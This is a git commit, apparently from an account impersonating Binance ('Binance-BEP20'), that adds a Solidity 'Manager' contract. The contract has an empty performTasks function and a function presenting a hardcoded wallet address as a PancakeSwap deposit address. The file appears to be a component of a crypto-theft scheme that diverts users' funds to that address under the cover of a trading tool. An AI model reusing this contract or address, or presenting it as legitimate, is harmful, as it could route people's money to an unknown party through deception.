2729db87c3ce1698c1f82e0975cf257e4dc35e09
Binance-BEP20 <94317805+Binance-BEP20@users.noreply.github.com>
2022-01-04 15:53:12 +0100

    Create main.sol

---
+++ main.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+        function performTasks() public {
+
+        }
+
+        function pancakeDepositAddress() public pure returns (address) {
+                return 0x67C5ccd95A011FA03057FECfCD9CCc98BAE2066d;
+        }
+}
